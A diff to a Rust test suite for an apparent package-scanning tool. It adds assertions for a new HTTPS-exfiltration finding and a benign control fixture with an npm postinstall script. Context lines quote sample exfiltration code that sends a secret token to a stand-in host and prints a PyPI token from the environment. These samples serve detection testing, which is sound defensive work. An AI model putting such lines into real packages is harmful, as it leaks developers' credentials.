@@ -314,6 +314,9 @@ fetch('https://example.invalid/collect?token=' + secret);
     assert!(analysis.findings.iter().any(|finding| {
         finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
     }));
+    assert!(analysis.findings.iter().any(|finding| {
+        finding.category == ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability
+    }));
 }
 
 #[test]
@@ -489,6 +492,9 @@ subprocess.run(["printf", data])
         .limitations
         .iter()
         .any(|reason| reason == "one_or_more_executable_members_are_not_fully_analyzed"));
+    assert!(analysis.findings.iter().any(|finding| {
+        finding.category == ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability
+    }));
 }
 
 #[test]
@@ -578,6 +584,34 @@ subprocess.run(["printf", os.environ["PYPI_TOKEN"]])
         .any(|edge| edge.to_file_id == payload_id));
     assert!(analysis.findings.iter().any(|finding| {
         finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
+    }));
+    assert!(analysis.findings.iter().any(|finding| {
+        finding.category == ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability
+    }));
+}
+
+#[test]
+fn credential_and_https_coexistence_without_dataflow_is_not_the_new_finding() {
+    const PACKAGE_JSON: &[u8] = br#"{
+  "name":"detector-fixture",
+  "version":"1.0.0",
+  "scripts":{"postinstall":"node index.js"}
+}"#;
+    const INDEX: &[u8] = br#"const token = process.env.NPM_TOKEN;
+console.log(token.length);
+fetch('https://example.invalid/status');
+"#;
+    let artifact = normalize_npm(&[
+        ("package/package.json", PACKAGE_JSON, 0o644),
+        ("package/index.js", INDEX, 0o644),
+    ]);
+    let analysis = analyze_normalized_artifact(&artifact).expect("analyze paired benign control");
+
+    assert!(analysis.findings.iter().any(|finding| {
+        finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
+    }));
+    assert!(analysis.findings.iter().all(|finding| {
+        finding.category != ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability
     }));
 }
 
